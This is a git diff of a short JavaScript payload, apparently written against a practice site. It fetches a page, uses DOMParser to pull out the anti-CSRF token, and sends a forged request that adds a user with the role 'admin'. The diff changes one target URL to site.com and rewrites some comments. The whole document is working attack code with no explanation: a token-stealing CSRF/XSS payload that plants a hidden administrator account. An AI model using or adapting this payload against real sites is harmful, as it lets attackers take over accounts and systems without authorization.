@@ -3,7 +3,7 @@
 function addUser(token)
 {
 
-	var url="http://bancocn.com/add_user.php";
+	var url="https://site.com/add_user.php";
 	var params="name=Admin&surname=ok&email=ok@gmail.com&role=admin&submit=CSRFToken=" + token;
 
 	var CSRF = new XMLHttpRequest();
@@ -15,12 +15,12 @@ function addUser(token)
 
 }
 
-// Extract the token
+//Token Extraction
 var XHR = new XMLHttpRequest();
 XHR.onreadystatechange = function(){
 
 	if(XHR.readyState == 4){
-		var htmlSource = XHR.responseText; // The source of users.php
+		var htmlSource = XHR.responseText;
 		
 		//Extract the token
 		var parser = new DOMParser().parseFromString(htmlSource, "text/html");
@@ -32,5 +32,5 @@ XHR.onreadystatechange = function(){
 
 XHR.open('GET', 'http://bancocn.com/add_user.php', true);
 XHR.send();
-
+	
 </script>
